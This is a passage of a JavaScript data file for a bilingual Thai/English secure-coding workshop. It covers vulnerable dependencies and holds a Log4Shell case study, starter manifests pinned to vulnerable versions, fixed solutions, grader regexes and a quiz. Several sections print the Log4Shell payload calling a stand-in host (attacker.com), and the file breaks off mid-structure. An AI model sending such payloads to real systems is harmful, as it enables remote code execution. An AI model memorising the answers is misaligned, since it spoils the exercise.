/* ============================================================================
 * js/data/w4.js — Workshop 4: Dependency, ไฟล์อัปโหลด & Server-Side Request
 *
 * 4 โจทย์: file-upload, vulnerable-deps, ssrf, insecure-deserialization
 * โครงสร้างข้อมูลของโจทย์ (ทุกข้อความที่ผู้เรียนเห็นเป็น { th, en })
 *
 * หมายเหตุสำหรับผู้ดูแลไฟล์นี้:
 * - โค้ดตัวอย่างอยู่ใน template literal ดังนั้น backtick, ${ และ backslash
 * ต้อง escape ให้ถูกต้อง (โจทย์ชุดนี้เลี่ยงไม่ให้มีอักขระเหล่านั้นในโค้ด)
 * - Grader ตัด comment ออกก่อนตรวจเสมอ (ดู js/grader.js) regex จึงไม่ต้อง
 * กังวลว่าจะไปแมตช์กับคอมเมนต์ภาษาไทย
 * - vulnerable-deps ใช้ "manifest" เป็นโค้ด: Java = pom.xml (lang xml),
 * Node = package.json (lang json) — checks ตรวจที่ "สตริงเวอร์ชัน"
 * ==========================================================================*/
(function (global) {
  'use strict';

 /* ======================================================================
 * 4.1 Insecure File Upload
 * ==================================================================== */
  const VULN_DEPS = {
    id: 'vulnerable-deps',
    title: { th: 'Vulnerable & Outdated Components', en: 'Vulnerable & Outdated Components' },
    severity: 'High',
    cwe: 'CWE-1104',
    owasp: 'A06:2021 – Vulnerable and Outdated Components',
    category: { th: 'Vulnerable Components', en: 'Vulnerable Components' },
    estMinutes: 12,
    points: 120,

    intro: {
      th: 'ช่องโหว่ในข้อนี้ไม่ได้อยู่ในโค้ดที่คุณเขียนเอง แต่อยู่ใน "เวอร์ชันของ library ที่คุณดึงเข้ามา" manifest (pom.xml / package.json) ล็อกไว้ที่เวอร์ชันเก่าที่มีช่องโหว่ระดับร้ายแรงซึ่งถูกเปิดเผยและมี CVE ไปแล้ว เช่น log4j-core 2.14.1 (Log4Shell) หรือ lodash 4.17.4 (prototype pollution) โค้ดของคุณอาจถูกต้องทุกบรรทัด แต่ attacker เจาะผ่าน library ที่คุณ import มาได้เลย และคุณ "เป็นเจ้าของ" ความเสี่ยงนี้เท่ากับว่าเขียนบั๊กเอง',
      en: 'Here the vulnerability is not in code you wrote but in the versions of libraries you pulled in. The manifest (pom.xml / package.json) pins outdated versions with well-known, published CVEs — log4j-core 2.14.1 (Log4Shell) or lodash 4.17.4 (prototype pollution). Your own code can be perfect line by line, yet an attacker breaks in through a library you imported, and you own that risk exactly as if you had written the bug yourself.'
    },
    attack: {
      th: 'สำหรับ log4j-core 2.14.1: attacker ส่งค่าที่จะถูก log เช่น User-Agent เป็น ${jndi:ldap://attacker.com/a} พอ Log4j เห็นก็ไปเรียก JNDI โหลด Java class จาก server attacker แล้วรัน = RCE โดยไม่ต้องล็อกอิน สำหรับ lodash 4.17.4: ยิง payload ที่มี key __proto__ ผ่านฟังก์ชันอย่าง defaultsDeep เพื่อ pollute Object.prototype ทำให้พฤติกรรมทั้งแอปเปลี่ยน ทั้งหมดนี้มีเครื่องมืออัตโนมัติสแกนหาเป้าทั่วอินเทอร์เน็ตอยู่แล้ว',
      en: 'For log4j-core 2.14.1: the attacker sends a value that gets logged — a User-Agent of ${jndi:ldap://attacker.com/a}. When Log4j sees it, it makes a JNDI call that loads a Java class from the attacker\'s server and runs it — RCE with no login. For lodash 4.17.4: send a payload containing a __proto__ key through a function like defaultsDeep to pollute Object.prototype and change the whole app\'s behaviour. Automated tooling already scans the entire internet for these targets.'
    },
    fix: {
      th: 'หลักการคือ "รู้ว่ามีอะไรอยู่ แล้วอัปให้ทัน": (1) อัปเกรด dependency ทุกตัวให้ถึงเวอร์ชันใน FIXED-IN ของ advisory เป็นอย่างน้อย ล็อกเวอร์ชันไว้ (dependencyManagement / package-lock.json) (2) ต่อเครื่องสแกน (OWASP dependency-check, npm audit) เข้า CI แล้วตั้งให้ "build พัง" เมื่อเจอของร้ายแรง เพื่อกันการย้อนกลับ (3) เปิดตัวอัปเดตอัตโนมัติ (Dependabot/Renovate) และเก็บ SBOM ไว้ตอบคำถาม "เรามี library ตัวไหนรุ่นไหนบ้าง" ได้ในไม่กี่นาที การแก้ที่แท้จริงคือ "กระบวนการ" ไม่ใช่การอัปครั้งเดียวจบ',
      en: 'The principle is know what you have and patch it promptly: (1) upgrade every dependency to at least the FIXED-IN version in the advisory and pin it (dependencyManagement / package-lock.json); (2) wire a scanner (OWASP dependency-check, npm audit) into CI and make the build fail on serious findings so it cannot regress; (3) enable automated updates (Dependabot/Renovate) and keep an SBOM so you can answer "which library at which version do we run" in minutes. The real fix is a process, not a one-off bump.'
    },
    keyPoints: {
      vuln: [
        { th: 'ช่องโหว่ไม่ได้อยู่ในโค้ดคุณ แต่อยู่ในเวอร์ชัน dependency ที่ pin ไว้เก่า', en: 'The flaw is not in your code but in the outdated dependency versions you pinned' },
        { th: 'log4j-core 2.14.1 และ lodash 4.17.4 มี CVE ร้ายแรงที่เปิดเผยและมี PoC แล้ว', en: 'log4j-core 2.14.1 and lodash 4.17.4 carry disclosed critical CVEs with public PoCs' },
        { th: 'คุณเป็นเจ้าของความเสี่ยงของ library ที่ import เท่ากับเขียนบั๊กนั้นเอง', en: 'You own the risk of an imported library exactly as if you wrote the bug' }
      ],
      attack: [
        { th: 'ช่องโหว่อย่าง Log4Shell ทำให้ค่าที่ถูก log เช่น User-Agent ที่มี payload พิเศษ สามารถกระตุ้นพฤติกรรมอันตรายใน library และนำไปสู่ RCE ได้', en: 'A User-Agent of ${jndi:ldap://attacker.com/a} makes Log4j load and run a class — RCE' }],
      fix: [
        { th: 'อัปเดต dependency ให้ถึงเวอร์ชันที่ advisory ระบุว่าแก้ช่องโหว่แล้ว และใช้ lockfile เพื่อควบคุมเวอร์ชันของ dependency ให้ชัดเจน', en: 'Upgrade every dependency to at least the advisory FIXED-IN version and pin it' },
        { th: 'เพิ่มเครื่องมือสแกน dependency เช่น npm audit หรือ dependency-check ใน CI และตั้งให้ build ไม่ผ่านเมื่อพบช่องโหว่ระดับที่องค์กรกำหนด', en: 'Wire npm audit / dependency-check into CI and fail the build on serious findings' },
        { th: 'ใช้เครื่องมือ scan และจัดทำ SBOM เพื่อรู้ว่าระบบใช้ library อะไรและเวอร์ชันใดอยู่บ้าง เช่น trivy / sonarqube', en: 'Enable Dependabot/Renovate and keep an SBOM so you know which versions you run' }
      ]
    },
    impact: {
      th: 'หาก dependency มีช่องโหว่ร้ายแรง เช่น RCE attacker อาจยึด server ได้จากระยะไกล',
      en: 'An RCE-class flaw in a popular library lets an attacker with no account take over your server remotely, and because the library is widely used, automated scanners exploit it at internet scale within hours of disclosure.'
    },

    caseStudy: {
      year: 2021,
      title: {
        th: 'Log4Shell — CVE-2021-44228 ใน library Apache Log4j 2',
        en: 'Log4Shell — CVE-2021-44228 in Apache Log4j 2'
      },
      body: {
        th: 'วันที่ 9–10 ธันวาคม 2021 มีการเปิดเผยช่องโหว่ CVE-2021-44228 ("Log4Shell") ใน library logging ยอดนิยม Apache Log4j 2 (เวอร์ชันไม่เกิน 2.14.1) เพียงแค่ทำให้แอปนำสตริงที่ attacker ควบคุมไปเข้า log ที่มี ${jndi:ldap://...} ก็รันโค้ดจากระยะไกลได้ทันที ได้คะแนน CVSS 10.0 และเพราะ Log4j ถูกฝังอยู่ในซอฟต์แวร์นับไม่ถ้วน จึงเกิดการสแกนและโจมตีทั่วโลกภายในไม่กี่ชั่วโมง Apache ออกแพตช์เป็นชุด (2.15.0 ยังมี CVE-2021-45046, สุดท้ายแนะนำ 2.17.1) บทเรียนคือ "รอรอบ release หน้า" ไม่ใช่ทางเลือกสำหรับช่องโหว่ระดับนี้ และคุณต้องรู้ให้ได้ว่ามี Log4j รุ่นไหนอยู่ที่ไหนบ้าง',
        en: 'On 9–10 December 2021, CVE-2021-44228 ("Log4Shell") was disclosed in the hugely popular logging library Apache Log4j 2 (versions up to 2.14.1). Simply getting an app to log an attacker-controlled string containing ${jndi:ldap://...} yielded immediate remote code execution. It scored CVSS 10.0, and because Log4j is embedded in countless products, worldwide scanning and exploitation began within hours. Apache shipped a series of patches (2.15.0 still had CVE-2021-45046; 2.17.1 was ultimately recommended). The lesson: "wait for the next release" is not an option for a flaw of this class, and you must be able to find which Log4j version runs where.'
      },
      source: {
        label: 'NVD — CVE-2021-44228 Detail',
        url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228'
      }
    },

    codeReview: [
      {
        th: 'เปิด pom.xml / package.json แล้วเทียบเวอร์ชันของ dependency ที่พบ CVE บ่อย (log4j-core, jackson-databind, commons-collections, lodash, jsonwebtoken, axios) กับเวอร์ชันที่แก้แล้ว ถ้าค้างของเก่าให้ตรวจต่อ',
        en: 'Open pom.xml / package.json and compare the versions of CVE-prone dependencies (log4j-core, jackson-databind, commons-collections, lodash, jsonwebtoken, axios) against the latest FIXED-IN.'
      },
      {
        th: 'ตรวจว่า CI มี gate จริงไหม ถามว่า dependency-check-maven / npm audit ทำให้ build ไม่ผ่าน (exit code != 0) เมื่อพบ severity สูงหรือเปล่า',
        en: 'Check whether the pipeline has a real gate — a dependency-check-maven / npm audit that fails the build (non-zero exit) on high severity, not just a report that prints and passes.'
      },
      {
        th: 'เห็นเวอร์ชันแบบลอย (^, ~, *, latest) ที่ไม่มี lockfile ล็อกไว้ ให้ตรวจต่อ เพราะ build แต่ละครั้งอาจได้เวอร์ชันไม่เท่ากัน และอาจดึงตัวที่มีช่องโหว่หรือฝัง malware เข้ามาเงียบ ๆ',
        en: 'Watch for floating version ranges (^, ~, *, latest) with no lockfile — builds become non-reproducible and may silently pull a vulnerable (or malware-laced) version.'
      }],

    testIt: {
      cmd: "npm audit --audit-level=high   # หรือ Java: mvn org.owasp:dependency-check-maven:check -DfailBuildOnCVSS=7",
      note: {
        th: 'ก่อนแก้: คำสั่งจะรายงานช่องโหว่ระดับ high/critical และคืน exit code != 0 (ถ้าตั้ง gate ไว้ build จะทำงานผิดพลาด) หลังอัปเกรดตาม FIXED-IN: จะได้ "found 0 vulnerabilities" และ exit code 0 ลองรัน npm ls lodash / mvn dependency:tree เพื่อยืนยันว่าเวอร์ชันที่ resolve จริง (รวม transitive) ถูกอัปแล้วจริง ไม่ใช่แค่ในไฟล์ manifest',
        en: 'Before the fix: the command reports high/critical findings and returns a non-zero exit code (with a gate, the build fails). After upgrading to FIXED-IN: you get "found 0 vulnerabilities" and exit code 0. Run npm ls lodash / mvn dependency:tree to confirm the actually-resolved version (including transitives) is upgraded, not just the manifest.'
      }
    },

    pitfalls: [
      {
        title: {
          th: 'ข้าม warning ของ devDependencies เพราะ npm audit ผ่าน',
          en: '"npm audit passed / it is only devDependency noise, so I skip it"'
        },
        why: {
          th: 'สองด้านที่พลาดกันบ่อย: (1) audit เห็นเฉพาะช่องโหว่ที่มีใน advisory database ณ ตอนนั้น ผ่านวันนี้ไม่ได้แปลว่าพรุ่งนี้จะผ่าน และไม่ครอบคลุมช่องโหว่ที่ยังไม่ถูกเปิดเผย (2) การเหมารวมว่า devDependency ไม่สำคัญเป็นความเข้าใจผิด — เครื่องมือ build/test รันบนโค้ดเบสและบน CI ที่มักถือ secret และเข้าถึง network ภายในได้ ช่องโหว่ใน dev tool จึงเป็นทางเข้า supply-chain ที่ของจริง สิ่งที่ควรทำคือดู "reachability" ว่าโค้ดเราเรียกส่วนที่มีช่องโหว่จริงไหม แล้วจัดลำดับ ไม่ใช่ปิดตาเพราะป้ายว่า dev',
          en: 'Two common misreadings: (1) audit only sees what is in the advisory database right now — passing today does not mean passing tomorrow, and it never covers undisclosed flaws; (2) assuming devDependencies do not matter is wrong — build/test tools run over your codebase on CI, which usually holds secrets and can reach the internal network, so a flaw in a dev tool is a very real supply-chain entry point. The right move is to assess reachability (does our code actually hit the vulnerable path?) and prioritize, not to ignore something because it is labelled "dev".'
        },
        short: {
          th: 'audit เห็นแค่ช่องโหว่ที่อยู่ใน advisory DB ตอนนั้น ผ่านวันนี้ไม่ได้หมายความว่าพรุ่งนี้ผ่าน',
          en: 'audit only sees advisories known right now; passing today is not passing tomorrow'
        }
      },
      {
        title: {
          th: 'เลื่อนการอัป dependency ไปรอบ release หน้า',
          en: '"We will upgrade at the next release, six weeks from now"'
        },
        why: {
          th: 'สำหรับช่องโหว่ RCE ที่โจมตีง่ายและมี PoC สาธารณะ ระยะเวลานั้นคือชั่วโมง ไม่ใช่สัปดาห์ Log4Shell ถูกสแกนและโจมตีเป็นวงกว้างภายในไม่กี่ชั่วโมงหลังเปิดเผย เพราะ payload สั้นและยิงได้โดยไม่ต้องล็อกอิน dependency ที่มีช่องโหว่ระดับ critical ควรมี "เส้นทางแก้ด่วน" (out-of-band patch) แยกจากรอบ release ปกติ และควรมี inventory/SBOM ที่ทำให้ตอบได้เร็วว่ากระทบตรงไหนบ้าง',
          en: 'For an easily exploited RCE with public PoC, that window is hours, not weeks. Log4Shell was scanned and exploited at scale within hours of disclosure because the payload is short and needs no login. Critical-severity dependencies deserve an out-of-band patch path separate from the normal release train, plus an inventory/SBOM so you can answer quickly what is affected.'
        },
        short: {
          th: 'RCE ที่มี PoC สาธารณะถูกโจมตีเป็นชั่วโมง ไม่ใช่สัปดาห์ ต้อง patch ด่วนแยกจาก release',
          en: 'A public-PoC RCE is exploited within hours, not weeks; patch out-of-band, not next release'
        }
      }
    ],

    languages: {
      java: {
        filename: 'pom.xml',
        lang: 'xml',
        starter:
`<project xmlns="http://maven.apache.org/POM/4.0.0">
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.acme</groupId>
  <artifactId>billing-service</artifactId>
  <version>1.4.0</version>

  <dependencies>
    <!-- logging -->
    <dependency>
      <groupId>org.apache.logging.log4j</groupId>
      <artifactId>log4j-core</artifactId>
      <version>2.14.1</version>
    </dependency>
    <!-- JSON -->
    <dependency>
      <groupId>com.fasterxml.jackson.core</groupId>
      <artifactId>jackson-databind</artifactId>
      <version>2.9.8</version>
    </dependency>
    <!-- utils -->
    <dependency>
      <groupId>commons-collections</groupId>
      <artifactId>commons-collections</artifactId>
      <version>3.2.1</version>
    </dependency>
  </dependencies>
</project>`,
        solution:
`<project xmlns="http://maven.apache.org/POM/4.0.0">
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.acme</groupId>
  <artifactId>billing-service</artifactId>
  <version>1.4.0</version>

  <dependencies>
    <dependency>
      <groupId>org.apache.logging.log4j</groupId>
      <artifactId>log4j-core</artifactId>
      <version>2.17.1</version>
    </dependency>
    <dependency>
      <groupId>com.fasterxml.jackson.core</groupId>
      <artifactId>jackson-databind</artifactId>
      <version>2.15.4</version>
    </dependency>
    <dependency>
      <groupId>commons-collections</groupId>
      <artifactId>commons-collections</artifactId>
      <version>3.2.2</version>
    </dependency>
  </dependencies>

  <build>
    <plugins>
      <plugin>
        <groupId>org.owasp</groupId>
        <artifactId>dependency-check-maven</artifactId>
        <version>9.2.0</version>
        <configuration>
          <failBuildOnCVSS>7</failBuildOnCVSS>
        </configuration>
        <executions>
          <execution>
            <goals>
              <goal>check</goal>
            </goals>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>`,
        explain: {
          th: 'dependency ทุกตัวถูกอัปเดตให้ถึงหรือเกินเวอร์ชัน FIXED-IN และเพิ่ม dependency-check-maven พร้อม failBuildOnCVSS=7 ทำให้ CI ปฏิเสธ build ที่พบช่องโหว่ CVSS ตั้งแต่ 7 ขึ้นไป การแก้จึงไม่ได้จบที่การเปลี่ยนเลขเวอร์ชัน แต่เพิ่ม gate ที่ตรวจซ้ำทุก build เพื่อไม่ให้ dependency ที่มีช่องโหว่กลับขึ้น production',
          en: 'Every dependency is bumped to at least its FIXED-IN version: log4j-core -> 2.17.1 (past Log4Shell and its follow-ups), jackson-databind -> 2.15.4, commons-collections -> 3.2.2 (which disables deserialization of unsafe classes by default). Just as important, the dependency-check-maven plugin with failBuildOnCVSS=7 makes any build with a CVSS >= 7 finding fail on CI — a gate that stops vulnerable dependencies from creeping back into production. The fix is not just version numbers but a mechanism that runs every time.'
        },
        checks: [
          {
            id: 'log4j-upgraded',
            label: { th: 'อัป log4j-core ให้พ้น Log4Shell (>= 2.17.x)', en: 'log4j-core upgraded past Log4Shell (>= 2.17.x)' },
            hint: { th: 'เปลี่ยน <version> ของ log4j-core เป็น 2.17.1', en: 'Change log4j-core <version> to 2.17.1' },
            weight: 3,
            mustMatch: /log4j-core<\/artifactId>\s*<version>\s*2\.1[7-9]\./
          },
          {
            id: 'jackson-upgraded',
            label: { th: 'อัป jackson-databind ให้พ้นเวอร์ชันที่มี CVE (>= 2.12)', en: 'jackson-databind upgraded past the vulnerable range (>= 2.12)' },
            hint: { th: 'เปลี่ยน <version> ของ jackson-databind เป็น 2.15.4', en: 'Change jackson-databind <version> to 2.15.4' },
            weight: 2,
            mustMatch: /jackson-databind<\/artifactId>\s*<version>\s*2\.(?:1[2-9]|[2-9]\d)\./
          },
          {
            id: 'commons-collections-upgraded',
            label: { th: 'อัป commons-collections เป็น 3.2.2 ขึ้นไป', en: 'commons-collections upgraded to 3.2.2+' },
            hint: { th: 'เปลี่ยน <version> ของ commons-collections เป็น 3.2.2', en: 'Change commons-collections <version> to 3.2.2' },
            weight: 2,
            mustMatch: /commons-collections<\/artifactId>\s*<version>\s*3\.2\.[2-9]/
          },
          {
            id: 'sca-gate',
            label: { th: 'มีเครื่องสแกน dependency (dependency-check-maven) ใน build', en: 'A dependency scanner (dependency-check-maven) is in the build' },
            hint: { th: 'เพิ่ม plugin org.owasp:dependency-check-maven พร้อม failBuildOnCVSS', en: 'Add the org.owasp:dependency-check-maven plugin with failBuildOnCVSS' },
            weight: 2,
            mustMatch: /dependency-check-maven|org\.owasp/i
          }
        ],
        traps: [
          {
            id: 'log4j-partial-fix',
            match: /log4j-core<\/artifactId>\s*<version>\s*2\.1[56]\./,
            message: {
              th: 'log4j 2.15.0/2.16.0 ยังไม่ปลอดภัยพอ: 2.15.0 ยังมี CVE-2021-45046 และ 2.16.0 ยังมี CVE-2021-45105 (DoS) ให้ขึ้นถึง 2.17.1 ซึ่งแก้ครบรวม CVE-2021-44832',
              en: 'log4j 2.15.0/2.16.0 is not safe enough: 2.15.0 still had CVE-2021-45046 and 2.16.0 still had CVE-2021-45105 (DoS). Move to 2.17.1, which fixes everything including CVE-2021-44832.'
            }
          },
          {
            id: 'log4j-still-vulnerable',
            match: /<version>\s*2\.14\.1\s*<\/version>/,
            message: {
              th: 'log4j-core ยังเป็น 2.14.1 ซึ่งคือเวอร์ชันที่มี Log4Shell (CVE-2021-44228, CVSS 10.0) เต็ม ๆ ต้องอัปเป็น 2.17.1',
              en: 'log4j-core is still 2.14.1 — the exact version with Log4Shell (CVE-2021-44228, CVSS 10.0). It must be upgraded to 2.17.1.'
            }
          }
        ]
      },

      node: {
        filename: 'package.json',
        lang: 'json',
        starter:
`{
  "name": "billing-service",
  "version": "1.4.0",
  "dependencies": {
    "express": "4.18.2",
    "lodash": "4.17.4",
    "jsonwebtoken": "0.4.0",
    "axios": "0.18.0"
  },
  "scripts": {
    "start": "node server.js",
    "test": "jest"
  }
}`,
        solution:
`{
  "name": "billing-service",
  "version": "1.4.0",
  "dependencies": {
    "express": "4.18.2",
    "lodash": "4.17.21",
    "jsonwebtoken": "9.0.2",
    "axios": "1.7.9"
  },
  "scripts": {
    "start": "node server.js",
    "test": "jest",
    "audit": "npm audit --audit-level=high"
  }
}`,
        explain: {
          th: 'ทุกแพ็กเกจถูกอัปให้ถึงหรือเกิน FIXED-IN: lodash -> 4.17.21 (พ้น prototype pollution ทั้งหลาย), jsonwebtoken -> 9.0.2 (พ้น algorithm confusion / alg:none), axios -> 1.7.9 และเพิ่ม script "audit" ที่รัน npm audit --audit-level=high ซึ่งจะคืน exit code != 0 เมื่อเจอช่องโหว่ระดับ high ขึ้นไป นำไปผูกใน CI ให้ build ไม่ผ่านได้ทันที เวอร์ชันถูกปักตายตัว (ไม่ใช่ range ลอย) เพื่อให้ build reproducible และควรมี package-lock.json คุม transitive dependency อีกชั้น',
          en: 'Every package is bumped to at least its FIXED-IN: lodash -> 4.17.21 (past the prototype-pollution issues), jsonwebtoken -> 9.0.2 (past the algorithm-confusion / alg:none flaws), axios -> 1.7.9, plus an "audit" script running npm audit --audit-level=high, which returns a non-zero exit code on high+ findings so CI can fail the build. Versions are pinned exactly (not floating ranges) for reproducible builds, and a package-lock.json should guard transitive dependencies too.'
        },
        checks: [
          {
            id: 'lodash-upgraded',
            label: { th: 'อัป lodash ให้พ้น prototype pollution (>= 4.17.12)', en: 'lodash upgraded past prototype pollution (>= 4.17.12)' },
            hint: { th: 'เปลี่ยน "lodash" เป็น "4.17.21"', en: 'Change "lodash" to "4.17.21"' },
            weight: 3,
            mustMatch: /"lodash"\s*:\s*"[\^~]?4\.17\.(?:1[2-9]|[2-9]\d)"/
          },
          {
            id: 'jsonwebtoken-upgraded',
            label: { th: 'อัป jsonwebtoken ให้พ้น algorithm confusion (>= 5)', en: 'jsonwebtoken upgraded past algorithm confusion (>= 5)' },
            hint: { th: 'เปลี่ยน "jsonwebtoken" เป็น "9.0.2"', en: 'Change "jsonwebtoken" to "9.0.2"' },
            weight: 2,
            mustMatch: /"jsonwebtoken"\s*:\s*"[\^~]?(?:[5-9]|\d\d)\./
          },
          {
            id: 'axios-upgraded',
            label: { th: 'อัป axios ให้พ้นเวอร์ชันที่มี CVE (>= 0.21 หรือ 1.x)', en: 'axios upgraded past the vulnerable range (>= 0.21 or 1.x)' },
            hint: { th: 'เปลี่ยน "axios" เป็น "1.7.9"', en: 'Change "axios" to "1.7.9"' },
            weight: 2,
            mustMatch: /"axios"\s*:\s*"[\^~]?(?:1\.\d|0\.2[1-9]|0\.[3-9])/
          },
          {
            id: 'audit-script',
            label: { th: 'มี script ที่รัน npm audit เป็น gate', en: 'An npm audit gate script is present' },
            hint: { th: 'เพิ่ม "audit": "npm audit --audit-level=high" ใน scripts', en: 'Add "audit": "npm audit --audit-level=high" to scripts' },
            weight: 2,
            mustMatch: /"audit"\s*:\s*"[^"]*npm audit|audit-level/
          }
        ],
        traps: [
          {
            id: 'still-vulnerable-versions',
            match: /"lodash"\s*:\s*"[\^~]?4\.17\.[0-9]"|"jsonwebtoken"\s*:\s*"[\^~]?0\.|"axios"\s*:\s*"[\^~]?0\.18\./,
            message: {
              th: 'ยังมีแพ็กเกจที่ค้างเวอร์ชันช่องโหว่: lodash 4.17.0–9 (prototype pollution), jsonwebtoken 0.x (algorithm confusion) หรือ axios 0.18.x ให้อัปตามคอลัมน์ FIXED-IN ใน Attack Lab',
              en: 'A package is still pinned to a vulnerable version: lodash 4.17.0–9 (prototype pollution), jsonwebtoken 0.x (algorithm confusion) or axios 0.18.x. Upgrade to the FIXED-IN column in the Attack Lab.'
            }
          },
          {
            id: 'floating-range',
            match: /"(?:lodash|jsonwebtoken|axios|express)"\s*:\s*"(?:\*|latest|>)/,
            message: {
              th: 'การใช้ range ลอยอย่าง "*"/"latest"/">=" โดยไม่มี lockfile ทำให้ build ไม่ reproducible และอาจดึงเวอร์ชันที่มีช่องโหว่ (หรือถูกฝัง malware) เข้ามาเงียบ ๆ ให้ปักเวอร์ชันตายตัวและ commit package-lock.json',
              en: 'A floating range like "*"/"latest"/">=" with no lockfile makes builds non-reproducible and may silently pull a vulnerable (or malware-laced) version. Pin exact versions and commit package-lock.json.'
            }
          }
        ]
      }
    },

    hints: [
      {
        th: 'ช่องโหว่นี้ไม่ได้อยู่ในโค้ดคุณ แต่อยู่ในเวอร์ชันของ dependency ที่ดึงเข้ามา วิธีแก้คือ "อัปเวอร์ชัน" ไม่ใช่ "เขียนโค้ดเพิ่ม"',
        en: 'This bug is not in your code but in the versions of the dependencies you pulled in. The fix is to upgrade versions, not to write more code.'
      },
      {
        th: 'ดูคอลัมน์ FIXED-IN ใน Attack Lab แล้วอัปเดต dependency ให้ถึงอย่างน้อยเวอร์ชันที่แก้ช่องโหว่ จากนั้นตั้ง CI ให้ build ไม่ผ่านเมื่อพบช่องโหว่ระดับร้ายแรง เพื่อป้องกันไม่ให้เวอร์ชันที่มีปัญหากลับเข้ามาอีก',
        en: 'Read the FIXED-IN column in the Attack Lab and bump every package to at least that version, then make the pipeline fail on serious findings so it cannot regress.'
      },
      {
        th: 'Java: log4j-core -> 2.17.1, jackson-databind -> 2.15.x, commons-collections -> 3.2.2 และเพิ่ม dependency-check-maven — Node: lodash -> 4.17.21, jsonwebtoken -> 9.x, axios -> 1.x และเพิ่ม script audit ที่รัน npm audit --audit-level=high',
        en: 'Java: log4j-core -> 2.17.1, jackson-databind -> 2.15.x, commons-collections -> 3.2.2, and add dependency-check-maven. Node: lodash -> 4.17.21, jsonwebtoken -> 9.x, axios -> 1.x, and add an audit script running npm audit --audit-level=high.'
      }
    ],

    quiz: [
      {
        q: {
          th: 'npm audit รายงาน "found 0 vulnerabilities" แปลว่าโปรเจกต์ปลอดภัยจาก dependency ที่มีช่องโหว่แล้วใช่หรือไม่',
          en: 'npm audit reports "found 0 vulnerabilities". Does that mean the project is safe from vulnerable dependencies?'
        },
        choices: [
          { th: 'ใช่ ถ้า audit ผ่านก็ถือว่าไม่มีช่องโหว่แน่นอน', en: 'Yes — if audit passes, there are definitely no vulnerabilities' },
          { th: 'ไม่เสมอไป audit เห็นเฉพาะช่องโหว่ที่อยู่ใน advisory database ณ เวลานั้น และไม่ครอบคลุมช่องโหว่ที่ยังไม่ถูกเปิดเผย', en: 'Not necessarily — audit only sees what is in the advisory database at that time and misses undisclosed flaws' },
          { th: 'ใช่ ตราบใดที่รัน audit ตอน build ทุกครั้ง', en: 'Yes, as long as you run audit at every build' },
          { th: 'ไม่ เพราะ audit ตรวจเฉพาะ devDependencies เท่านั้น', en: 'No, because audit only checks devDependencies' }
        ],
        answer: 1,
        why: {
          th: 'audit เป็นการเทียบกับ database advisory ที่เปลี่ยนแปลงตลอด ผ่านวันนี้ไม่ได้แปลว่าพรุ่งนี้จะผ่าน และช่องโหว่ที่ยังไม่มีใครรายงาน (0-day) ก็ไม่ปรากฏ การพึ่ง audit อย่างเดียวจึงเป็นแค่ชั้นหนึ่ง ต้องมีการอัปเดตสม่ำเสมอ, ล็อกเวอร์ชัน และดู reachability ประกอบ',
          en: 'audit compares against an ever-changing advisory database — passing today does not guarantee tomorrow, and undisclosed (0-day) flaws never appear. Relying on audit alone is only one layer; you also need regular updates, pinned versions, and reachability analysis.'
        },
        whyWrong: [
          { th: '"ผ่าน" หมายถึง "ยังไม่มี advisory ที่ตรงกับเวอร์ชันเหล่านี้ ณ ตอนนี้" ไม่ใช่การรับประกันว่าไม่มีช่องโหว่', en: '"Passing" means "no advisory currently matches these versions", not a guarantee of zero vulnerabilities.' },
          null,
          { th: 'การรันบ่อยช่วยให้เจอเร็วขึ้นก็จริง แต่ยังจำกัดอยู่ที่สิ่งที่ database รู้ ณ ตอนนั้นอยู่ดี', en: 'Running it often helps you catch things sooner, but it is still limited to what the database knows at that moment.' },
          { th: 'audit ตรวจทั้ง dependencies และ devDependencies ไม่ได้จำกัดแค่ dev — และช่องโหว่ใน dev tool บน CI ก็เป็นทางเข้า supply-chain จริง', en: 'audit checks both dependencies and devDependencies, not just dev — and a flaw in a dev tool on CI is a real supply-chain entry point.' }
        ]
      },
      {
        q: {
          th: 'log4j-core 2.14.1 มีช่องโหว่ Log4Shell ทีมเสนอให้ "รออัปตอน release รอบหน้าอีก 6 สัปดาห์" ความเสี่ยงหลักคืออะไร',
          en: 'log4j-core 2.14.1 has Log4Shell. The team proposes to "wait for the next release in six weeks". What is the main risk?'
        },
        choices: [
          { th: 'ไม่มีความเสี่ยง เพราะ attacker ต้องมีบัญชีที่ล็อกอินได้ก่อน', en: 'No risk — an attacker must have a valid login first' },
          { th: 'ช่องโหว่ระดับนี้ถูกสแกนและโจมตีเป็นวงกว้างภายในไม่กี่ชั่วโมงหลังเปิดเผย การรอคือการเปิดหน้าต่างให้ถูกเจาะ', en: 'A flaw of this class is scanned and exploited at scale within hours of disclosure — waiting opens a window to be breached' },
          { th: 'ความเสี่ยงหลักคือ build จะช้าลงเพราะต้องดาวน์โหลด dependency ใหม่', en: 'The main risk is a slower build from downloading new dependencies' },
          { th: 'ไม่มีความเสี่ยง ถ้า server อยู่หลัง firewall', en: 'No risk, as long as the server is behind a firewall' }
        ],
        answer: 1,
        why: {
          th: 'Log4Shell ยิงได้โดยไม่ต้องล็อกอิน payload สั้น และมี PoC สาธารณะทันที จึงเกิดการสแกน/โจมตีทั่วอินเทอร์เน็ตภายในไม่กี่ชั่วโมง ช่องโหว่ระดับ critical ต้องมีเส้นทางแก้ด่วนแยกจากรอบ release ปกติ',
          en: 'Log4Shell needs no login, has a short payload, and had public PoC immediately, so internet-wide scanning and exploitation began within hours. Critical flaws need an emergency patch path separate from the normal release train.'
        },
        whyWrong: [
          { th: 'Log4Shell เป็น pre-auth RCE ไม่ต้องมีบัญชีเลย แค่ทำให้แอป log ค่าที่ attacker ควบคุมได้ก็พอ', en: 'Log4Shell is pre-auth RCE — no account needed; it is enough to get the app to log an attacker-controlled value.' },
          null,
          { th: 'เรื่อง build ช้าเป็นผลข้างเคียงเล็กน้อย ไม่ใช่ความเสี่ยงด้านความปลอดภัยที่แท้จริง', en: 'A slower build is a minor side effect, not the real security risk.' },
          { th: 'firewall ไม่ได้ช่วย เพราะ payload มากับ request ปกติ (เช่น User-Agent) และ JNDI callback ออกไปหา server attacker จากในวง', en: 'A firewall does not help: the payload rides in on a normal request (e.g. User-Agent) and the JNDI callback reaches out to the attacker from inside the network.' }
        ]
      }
    ],

    sim: {
      kind: 'sca',
      config: {
        advisories: [
